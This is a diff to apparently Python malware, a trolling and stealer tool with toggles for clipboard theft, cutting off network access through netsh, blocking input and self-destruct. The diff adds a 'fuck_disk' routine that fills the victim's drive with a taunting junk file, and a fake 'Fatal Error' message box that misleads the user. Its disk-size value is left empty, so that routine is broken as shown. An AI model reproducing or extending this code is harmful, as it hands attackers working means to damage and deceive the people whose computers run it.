@@ -11,11 +11,13 @@ pc_info = False
 steal_clipboard = False
 down_file = False
 play_music = False
+fake_error = False
 
 fuck_internet = False
 black_screen = False
 fuck_input = False
 shortcut_spam = False
+fuck_disk = True
 
 
 import os
@@ -368,6 +370,19 @@ Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
         except:
             pass
 
+    if fuck_disk:
+        try:
+            Sizexd123 = ''
+            path123 = r"C:\temp_420.txt"
+            small_string = "Imagine getting your disk trashed lol - R3CI 15/01/2024 19:53"
+            repetitions = int((int(Sizexd123) * 1024 * 1024) / len(small_string))
+            content = small_string * repetitions
+
+            with open(path123, "w") as file:
+                file.write(content)
+        except Exception as e:
+            input(e)
+
     if play_music:
         try:
             music_url = ''
@@ -418,6 +433,9 @@ Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
                 os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
         except:
             pass
+
+    if fake_error:
+        ctypes.windll.user32.MessageBoxW(None, 'Code: 0x93182002132\nInternal error occurred while importing modules.', 'Fatal Error', 0)
 
     if destruct:
         util.destruct()
